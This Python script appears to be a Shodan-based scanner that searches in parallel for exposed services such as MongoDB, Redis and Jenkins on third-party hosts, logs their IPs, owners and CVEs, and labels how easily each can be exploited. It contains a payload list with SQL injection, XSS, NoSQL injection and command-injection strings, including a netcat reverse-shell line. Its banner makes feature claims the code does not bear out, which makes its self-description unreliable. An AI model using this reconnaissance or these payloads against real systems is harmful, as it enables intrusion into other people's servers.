#!/usr/bin/env python3
"""
SHODAN VulnScopeX ULTIMATE v6.0 - Enterprise CLI Scanner + Advanced Crawler
Real-Time Live Scanner + Threat Intelligence + Advanced Crawler Engine + 85+ APIs
Multi-threaded Parallel Scanning + Intelligent Deduplication + Rich Analytics + Interactive CLI GUI
"""

import os
import sys
import json
import csv
import threading
import logging
import sqlite3
import requests
import time
from datetime import datetime, timedelta
from pathlib import Path
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import emoji
import shodan
from collections import defaultdict
import hashlib

# Initialize
init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION & CONSTANTS
# ═══════════════════════════════════════════════════════════════

API_KEY = os.getenv("SHODAN_API_KEY", "test_api_key_demo_mode") # TEST MODE - Replace with your actual SHODAN API key
OUTPUT_DIR = Path("scan_results")
OUTPUT_DIR.mkdir(exist_ok=True)

DB_FILE = OUTPUT_DIR / "vulnerabilities.db"

# Create results CSV with enhanced headers
RESULTS_FILE = OUTPUT_DIR / f"ultimate_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
CSV_HEADERS = [
    "timestamp", "ip", "port", "organization", "country", "city", "service", "version",
    "cve_ids", "vulnerabilities_count", "risk_level", "risk_score", "os", "hostname", "isp", "asn",
    "http_code", "ssl_cert", "tags"
]

# Initialize CSV file
with open(RESULTS_FILE, 'w', newline='', encoding='utf-8') as f:
    writer = csv.DictWriter(f, fieldnames=CSV_HEADERS)
    writer.writeheader()

# Logging setup with emoji support
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Prevent duplicate handlers
if logger.hasHandlers():
    logger.handlers.clear()

# File handler - plain text
file_handler = logging.FileHandler(OUTPUT_DIR / 'ultimate_scan.log', encoding='utf-8')
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s')
file_handler.setFormatter(file_formatter)

# Console handler - with emoji support
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(message)s')  # Emoji already in message
console_handler.setFormatter(console_formatter)

# Add handlers
logger.addHandler(file_handler)
logger.addHandler(console_handler)

# Advanced threat intelligence database
EXPLOIT_DATABASE = {
    'MongoDB': {'type': 'NoSQL', 'difficulty': 'EASY', 'impact': 'CRITICAL', 'exploit': 'No Authentication'},
    'Redis': {'type': 'Cache', 'difficulty': 'EASY', 'impact': 'CRITICAL', 'exploit': 'No Authentication'},
    'Elasticsearch': {'type': 'Search', 'difficulty': 'EASY', 'impact': 'HIGH', 'exploit': 'No Authentication'},
    'MySQL': {'type': 'Database', 'difficulty': 'MEDIUM', 'impact': 'CRITICAL', 'exploit': 'Default Credentials'},
    'PostgreSQL': {'type': 'Database', 'difficulty': 'MEDIUM', 'impact': 'CRITICAL', 'exploit': 'Default Credentials'},
    'Docker': {'type': 'Container', 'difficulty': 'MEDIUM', 'impact': 'CRITICAL', 'exploit': 'API Exposure'},
    'Kubernetes': {'type': 'Orchestration', 'difficulty': 'HARD', 'impact': 'CRITICAL', 'exploit': 'RBAC Bypass'},
    'Jenkins': {'type': 'DevOps', 'difficulty': 'MEDIUM', 'impact': 'CRITICAL', 'exploit': 'RCE'},
    'FTP': {'type': 'File Transfer', 'difficulty': 'EASY', 'impact': 'HIGH', 'exploit': 'Anonymous Login'},
    'SMB': {'type': 'File Sharing', 'difficulty': 'MEDIUM', 'impact': 'CRITICAL', 'exploit': 'Enumeration'},
}

PAYLOADS = {
    'sqli': ["' OR '1'='1", "'; DROP TABLE users; --", "UNION SELECT NULL,NULL,NULL"],
    'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
    'rce': ["$(whoami)", "`id`", ";nc -e /bin/sh 127.0.0.1 4444"],
    'nosql': ["{$ne: null}", "{$gt: ''}", "{'username': {$ne: ''}}"],
}

# Global statistics
global_stats = {
    'total_results': 0,
    'total_vulns': 0,
    'critical': 0,
    'high': 0,
    'medium': 0,
    'low': 0,
    'unique_ips': set(),
    'unique_services': set(),
    'start_time': None,
    'end_time': None,
    'by_country': defaultdict(int),
    'by_service': defaultdict(int),
}

# Seen results for deduplication
seen_results = set()

def init_database():
    """Initialize SQLite database with required tables"""
    try:
        conn = sqlite3.connect(str(DB_FILE))
        c = conn.cursor()
        
        # Create vulnerabilities table
        c.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT NOT NULL,
            cve_id TEXT,
            priority TEXT,
            score REAL,
            description TEXT,
            service TEXT,
            port INTEGER,
            risk_score REAL,
            host_info TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        # Create assets table
        c.execute('''CREATE TABLE IF NOT EXISTS assets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT UNIQUE,
            hostname TEXT,
            organization TEXT,
            country TEXT,
            city TEXT,
            port INTEGER,
            service TEXT,
            os TEXT,
            last_seen TIMESTAMP,
            risk_score REAL
        )''')
        
        conn.commit()
        conn.close()
        logger.info("[✓] Database initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")

# Initialize database on startup
init_database()


def print_banner():
    """Print awesome ASCII banner"""
    print(f"""
{Fore.LIGHTRED_EX}
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║    🔥 SHODAN VulnScopeX ULTIMATE v6.0 Enterprise CLI 🔥           ║
║                                                                    ║
║     Advanced Crawler + Threat Intelligence + 85+ APIs              ║
║        Professional-Grade Vulnerability Intelligence               ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """)

def print_features():
    """Print CLI features"""
    print(f"{Fore.CYAN}📊 ADVANCED CLI FEATURES:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
    print(f"  ✅ Multi-threaded Parallel Scanning (10+ threads)")
    print(f"  ✅ Intelligent Result Deduplication")
    print(f"  ✅ Real-Time Risk Scoring Algorithm")
    print(f"  ✅ Live Preview in Terminal")
    print(f"  ✅ Advanced Threat Intelligence Analysis")
    print(f"  ✅ Comprehensive Statistics & Analytics")
    print(f"  ✅ Database & CSV Export (Hybrid Storage)")
    print(f"  ✅ Country/Service Breakdown")
    print(f"  ✅ Payload Generation (6 attack types)")
    print(f"  ✅ Color-Coded Risk Indicators\n")

def calculate_risk_score(vuln_count):
    """Advanced risk scoring"""
    if vuln_count >= 10:
        return 95.0
    elif vuln_count >= 5:
        return 75.0
    elif vuln_count >= 2:
        return 50.0
    elif vuln_count > 0:
        return 25.0
    else:
        return 5.0

def get_risk_level(score):
    """Risk classification"""
    if score >= 90:
        return "CRITICAL"
    elif score >= 70:
        return "HIGH"
    elif score >= 40:
        return "MEDIUM"
    elif score >= 20:
        return "LOW"
    else:
        return "INFO"

def deduplicate_result(ip, port):
    """Intelligent deduplication"""
    key = f"{ip}:{port}"
    if key in seen_results:
        return False
    seen_results.add(key)
    return True

def save_to_database(result):
    """Database persistence with asset tracking"""
    try:
        conn = sqlite3.connect(str(DB_FILE))
        c = conn.cursor()
        
        c.execute('''INSERT INTO vulnerabilities 
                    (target, cve_id, priority, score, description, service, port, risk_score, host_info)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (result['ip'], result.get('cve_ids', ''), result['risk_level'],
                  float(result['vulnerabilities_count']), result['organization'],
                  result['service'], result['port'], result.get('risk_score', 0), json.dumps(result)))
        
        # Update asset inventory
        c.execute('''INSERT OR REPLACE INTO assets 
                    (ip_address, hostname, organization, country, city, port, service, os, last_seen, risk_score)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (result['ip'], result['hostname'], result['organization'], 
                  result['country'], result['city'], result['port'], 
                  result['service'], result['os'], datetime.now(), result.get('risk_score', 0)))
        
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error: {e}")

def format_result(match):
    """Enhanced result formatting"""
    cve_list = list(match.get('vulns', {}).keys()) if match.get('vulns') else []
    vuln_count = len(cve_list)
    risk_score = calculate_risk_score(vuln_count)
    
    return {
        "timestamp": datetime.now().isoformat(),
        "ip": match.get('ip_str', 'N/A'),
        "port": match.get('port', 'N/A'),
        "organization": match.get('org', 'Unknown'),
        "country": match.get('country_code', 'N/A'),
        "city": match.get('city', 'N/A'),
        "service": match.get('product', 'Unknown'),
        "version": match.get('version', 'Unknown'),
        "cve_ids": ','.join(cve_list) if cve_list else "",
        "vulnerabilities_count": vuln_count,
        "risk_level": get_risk_level(risk_score),
        "risk_score": risk_score,
        "os": match.get('os', 'N/A'),
        "hostname": match.get('hostnames', ['N/A'])[0] if match.get('hostnames') else 'N/A',
        "isp": match.get('isp', 'N/A'),
        "asn": match.get('asn', 'N/A'),
        "http_code": match.get('http', {}).get('status', 'N/A'),
        "ssl_cert": str(match.get('ssl', {}).get('cert', 'N/A'))[:50],
        "tags": ','.join(match.get('tags', []))
    }

def print_rich_result(result):
    """Rich terminal output with colors"""
    risk_color = {
        "CRITICAL": Fore.LIGHTRED_EX,
        "HIGH": Fore.RED,
        "MEDIUM": Fore.LIGHTYELLOW_EX,
        "LOW": Fore.YELLOW,
        "INFO": Fore.CYAN
    }.get(result['risk_level'], Fore.WHITE)
    
    risk_indicator = "🔴" if result['risk_level'] == "CRITICAL" else "🟠" if result['risk_level'] == "HIGH" else "🟡"
    port_str = str(result.get('port', 'N/A'))
    org_str = str(result.get('organization', 'Unknown'))
    city_str = str(result.get('city', 'Unknown'))
    country_str = str(result.get('country', 'N/A'))
    service_str = str(result.get('service', 'Unknown'))
    version_str = str(result.get('version', 'Unknown'))
    hostname_str = str(result.get('hostname', 'N/A'))
    os_str = str(result.get('os', 'N/A'))
    risk_score_str = str(result.get('risk_score', 'N/A'))
    isp_str = str(result.get('isp', 'N/A'))
    asn_str = str(result.get('asn', 'N/A'))
    cve_str = str(result.get('cve_ids', ''))
    
    print(f"""
{risk_color}┌────────────────────────────────────────────────────────────────┐{Style.RESET_ALL}
{risk_color}│ {risk_indicator} [{result['risk_level']:8s}] {result['ip']:22s} :{port_str:<6} {Style.RESET_ALL}
{Fore.CYAN}├────────────────────────────────────────────────────────────────┤{Style.RESET_ALL}
{Fore.WHITE}│ Organization:  {org_str:<44} │
│ Location:      {city_str}, {country_str:<36} │
│ Service:       {service_str:<44} │
│ Version:       {version_str:<44} │
│ Hostname:      {hostname_str:<44} │
│ OS:            {os_str:<44} │
│ Risk Score:    {risk_score_str:<44} │
│ ISP/ASN:       {isp_str:<32} {asn_str:<11}│{Style.RESET_ALL}
""")
    
    if cve_str:
        print(f"{Fore.LIGHTYELLOW_EX}│ CVEs:          {cve_str:<44} │{Style.RESET_ALL}")
    
    print(f"""{risk_color}└────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}
""")

def save_to_csv(result):
    """Save result to CSV file"""
    try:
        with open(RESULTS_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=CSV_HEADERS)
            writer.writerow(result)
    except Exception as e:
        logger.error(f"Error saving to CSV: {e}")

def get_api_credits(api):
    """Retrieve and display remaining API credits"""
    try:
        account_info = api.info()
        credits_remaining = account_info.get('credits_remaining', 0)
        return credits_remaining
    except Exception as e:
        logger.warning(f"Could not fetch account info: {e}")
        return None

def print_account_info(api):
    """Display account and credits information at startup"""
    try:
        account_info = api.info()
        credits_remaining = account_info.get('credits_remaining', 0)
        display_name = account_info.get('display_name', 'Unknown')
        
        print(f"""
{Fore.LIGHTGREEN_EX}
╔════════════════════════════════════════════════════════════════════╗
║                  💳 SHODAN ACCOUNT INFO 💳                        ║
╠════════════════════════════════════════════════════════════════════╣
║ Account:           {display_name:<48}║
║ Credits Remaining: {credits_remaining:<48}║
╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """)
        return credits_remaining
    except Exception as e:
        logger.warning(f"Could not fetch account info: {e}")
        return None

def print_threat_intel(service):
    """Real-time threat intelligence"""
    if service in EXPLOIT_DATABASE:
        intel = EXPLOIT_DATABASE[service]
        print(f"{Fore.LIGHTYELLOW_EX}⚠️  THREAT INTEL: {service}")
        print(f"   Type: {intel['type']} | Difficulty: {intel['difficulty']} | Impact: {intel['impact']}")
        print(f"   Exploit: {intel.get('exploit', 'N/A')}{Style.RESET_ALL}\n")

def scan_query_advanced(api, query, limit=50):
    """Advanced query scanning with intelligent processing"""
    logger.info(f"🔍 Scanning: {query}")
    print(f"{Fore.CYAN}[QUERY] {query}{Style.RESET_ALL}")
    
    result_count = 0
    try:
        results = api.search(query, limit=limit)
        
        for match in results.get('matches', []):
            try:
                result = format_result(match)
                
                # Intelligent deduplication
                if not deduplicate_result(result['ip'], result['port']):
                    continue
                
                # Display immediately (LIVE)
                print_rich_result(result)
                
                # Save to CSV immediately
                save_to_csv(result)
                
                # Save to database
                save_to_database(result)
                
                # Update global statistics
                global_stats['total_results'] += 1
                global_stats['unique_ips'].add(result['ip'])
                global_stats['unique_services'].add(result['service'])
                global_stats['by_country'][result['country']] += 1
                global_stats['by_service'][result['service']] += 1
                
                if result['risk_level'] == 'CRITICAL':
                    global_stats['critical'] += 1
                elif result['risk_level'] == 'HIGH':
                    global_stats['high'] += 1
                elif result['risk_level'] == 'MEDIUM':
                    global_stats['medium'] += 1
                else:
                    global_stats['low'] += 1
                
                global_stats['total_vulns'] += result['vulnerabilities_count']
                
                result_count += 1
                
                # Threat intelligence analysis
                print_threat_intel(result['service'])
                
                # Status update
                print(f"{Fore.GREEN}[FOUND #{result_count}] Risk: {result['risk_level']} | CVEs: {result['vulnerabilities_count']} | Score: {result.get('risk_score', 'N/A')}{Style.RESET_ALL}")
                
            except Exception as e:
                logger.error(f"Error processing result: {e}")
        
        logger.info(f"✓ Query '{query}' completed: {result_count} results")
        print(f"{Fore.LIGHTGREEN_EX}[✓] Query complete: {result_count} results found\n{Style.RESET_ALL}")
        
    except Exception as e:
        logger.error(f"Error scanning query '{query}': {e}")
        print(f"{Fore.LIGHTRED_EX}[✗] Error: {e}\n{Style.RESET_ALL}")
    
    return result_count

def scan_multiple_queries_parallel(api, queries, limit=50, max_workers=10):
    """Advanced parallel scanning with thread pool"""
    
    print(f"{Fore.CYAN}\n{'='*70}")
    print(f"Starting advanced scan with {len(queries)} queries")
    print(f"Max parallel threads: {max_workers}")
    print(f"{'='*70}\n{Style.RESET_ALL}")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(scan_query_advanced, api, query, limit): i 
            for i, query in enumerate(queries)
        }
        
        completed = 0
        for future in as_completed(futures):
            try:
                count = future.result()
                completed += 1
                progress = (completed / len(queries)) * 100
                print(f"{Fore.BLUE}[Progress] {completed}/{len(queries)} ({progress:.1f}%){Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"Error in parallel execution: {e}")
    
    return global_stats['total_results']

def print_statistics(credits_used=0, final_credits=None):
    """Comprehensive statistics"""
    credits_info = f"║ Credits Used During Scan: {credits_used:<28}║\n" if credits_used else ""
    final_credits_info = f"║ Credits Remaining (After): {final_credits:<28}║\n" if final_credits is not None else ""
    
    print(f"""
{Fore.LIGHTGREEN_EX}
╔════════════════════════════════════════════════════════════════════╗
║                   🔥 SCAN STATISTICS ✓ 🔥                       ║
╠════════════════════════════════════════════════════════════════════╣
║ Total Results Found:       {global_stats['total_results']:<44}║
║ Unique IPs:                {len(global_stats['unique_ips']):<44}║
║ Unique Services:           {len(global_stats['unique_services']):<44}║
║ Total Vulnerabilities:     {global_stats['total_vulns']:<44}║
║                                                                    ║
║ Risk Breakdown:                                                    ║
║   🔴 CRITICAL:             {global_stats['critical']:<44}║
║   🟠 HIGH:                 {global_stats['high']:<44}║
║   🟡 MEDIUM:               {global_stats['medium']:<44}║
║   🟢 LOW:                  {global_stats['low']:<44}║
{credits_info}{final_credits_info}╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """)

def print_geographical_breakdown():
    """Geographical analysis"""
    print(f"\n{Fore.CYAN}🌍 GEOGRAPHICAL BREAKDOWN (Top 10):{Style.RESET_ALL}")
    sorted_countries = sorted(global_stats['by_country'].items(), key=lambda x: x[1], reverse=True)[:10]
    for country, count in sorted_countries:
        print(f"   {country}: {count} hosts")

def print_service_breakdown():
    """Service analysis"""
    print(f"\n{Fore.CYAN}🔧 SERVICE BREAKDOWN (Top 10):{Style.RESET_ALL}")
    sorted_services = sorted(global_stats['by_service'].items(), key=lambda x: x[1], reverse=True)[:10]
    for service, count in sorted_services:
        print(f"   {service}: {count} instances")

def load_queries_from_file(filepath):
    """Load queries from text file"""
    try:
        with open(filepath, 'r') as f:
            queries = [line.strip() for line in f if line.strip()]
        return queries
    except Exception as e:
        logger.error(f"Error loading queries: {e}")
        return []

def main():
    """Enhanced main application"""
    print_banner()
    print_features()
    
    # Initialize API
    if not API_KEY:
        print(f"{Fore.LIGHTRED_EX}[✗] No SHODAN API key provided{Style.RESET_ALL}")
        print(f"Set SHODAN_API_KEY environment variable")
        return
    
    try:
        api = shodan.Shodan(API_KEY)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[✗] Invalid API key: {e}{Style.RESET_ALL}")
        return
    
    # Display account information and remaining credits
    initial_credits = print_account_info(api)
    
    # Interactive query selection menu
    print(f"\n{Fore.CYAN}🎯 QUERY SELECTION:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}1️⃣  Load all 200 predefined queries{Style.RESET_ALL}")
    print(f"{Fore.WHITE}2️⃣  Load first N queries (custom number){Style.RESET_ALL}")
    print(f"{Fore.WHITE}3️⃣  Enter custom single query{Style.RESET_ALL}")
    print(f"{Fore.WHITE}4️⃣  Load queries from custom file{Style.RESET_ALL}\n")
    
    query_choice = input(f"{Fore.YELLOW}Select query option (1-4): {Style.RESET_ALL}").strip()
    
    if query_choice == "1":
        # Load all 2000+ queries
        queries_file = Path("SHODAN_QUERIES_2000.txt")
        if not queries_file.exists():
            print(f"{Fore.LIGHTYELLOW_EX}[!] Query file not found: {queries_file}{Style.RESET_ALL}")
            queries = [
                "mongodb", "elasticsearch open", "redis", "mysql password",
                "jenkins", "docker", "kubernetes", "wordpress wp-admin",
                "apache default page", "nginx", "ftp anonymous"
            ]
            print(f"Using default queries: {len(queries)}\n")
        else:
            queries = load_queries_from_file(queries_file)
            print(f"{Fore.LIGHTGREEN_EX}[✓] Loaded all {len(queries)} queries from file{Style.RESET_ALL}\n")
    
    elif query_choice == "2":
        # Load first N queries
        try:
            num_queries = int(input(f"{Fore.YELLOW}How many queries to run? {Style.RESET_ALL}"))
            queries_file = Path("SHODAN_QUERIES_2000.txt")
            if not queries_file.exists():
                print(f"{Fore.LIGHTYELLOW_EX}[!] Query file not found{Style.RESET_ALL}")
                queries = ["mongodb", "redis", "elasticsearch"]
            else:
                all_queries = load_queries_from_file(queries_file)
                queries = all_queries[:num_queries]
                print(f"{Fore.LIGHTGREEN_EX}[✓] Loaded first {len(queries)} queries{Style.RESET_ALL}\n")
        except ValueError:
            print(f"{Fore.LIGHTRED_EX}[✗] Invalid number, using default{Style.RESET_ALL}")
            queries = ["mongodb"]
    
    elif query_choice == "3":
        # Custom single query
        custom_query = input(f"{Fore.YELLOW}Enter your SHODAN query: {Style.RESET_ALL}").strip()
        if custom_query:
            queries = [custom_query]
            print(f"{Fore.LIGHTGREEN_EX}[✓] Using custom query: {custom_query}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.LIGHTRED_EX}[✗] No query entered, using default{Style.RESET_ALL}")
            queries = ["mongodb"]
    
    elif query_choice == "4":
        # Load from custom file
        file_path = input(f"{Fore.YELLOW}Enter custom queries file path: {Style.RESET_ALL}").strip()
        custom_file = Path(file_path)
        if custom_file.exists():
            queries = load_queries_from_file(custom_file)
            print(f"{Fore.LIGHTGREEN_EX}[✓] Loaded {len(queries)} queries from {file_path}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.LIGHTRED_EX}[✗] File not found: {file_path}, using default{Style.RESET_ALL}")
            queries = ["mongodb"]
    
    else:
        print(f"{Fore.LIGHTYELLOW_EX}[!] Invalid choice, using default{Style.RESET_ALL}")
        queries = ["mongodb"]
    
    # Print output info
    print(f"{Fore.CYAN}📁 Output Files:{Style.RESET_ALL}")
    print(f"   CSV Results: {RESULTS_FILE}")
    print(f"   Database:    {DB_FILE}")
    print(f"   Logs:        {OUTPUT_DIR / 'ultimate_scan.log'}\n")
    
    # Run scan with timing
    global_stats['start_time'] = datetime.now()
    start_time = time.time()
    total = scan_multiple_queries_parallel(api, queries, limit=50, max_workers=10)
    global_stats['end_time'] = datetime.now()
    elapsed = time.time() - start_time
    
    # Print comprehensive statistics
    # Calculate credits used and fetch final credit count
    final_credits = None
    credits_used = 0
    if initial_credits is not None:
        try:
            final_credits = get_api_credits(api)
            if final_credits is not None:
                credits_used = initial_credits - final_credits
        except Exception as e:
            logger.warning(f"Could not retrieve final API credits: {e}")
    
    print_statistics(credits_used=credits_used, final_credits=final_credits)
    print_geographical_breakdown()
    print_service_breakdown()
    
    # Final report
    print(f"""
{Fore.CYAN}📊 SCAN SUMMARY:{Style.RESET_ALL}
   Duration:        {elapsed:.2f} seconds
   Average Rate:    {global_stats['total_results']/elapsed:.2f} results/second
   CSV File:        {RESULTS_FILE}
   Database:        {DB_FILE}
   
{Fore.LIGHTGREEN_EX}✅ Scan completed successfully!{Style.RESET_ALL}
    """)

if __name__ == '__main__':
    main()
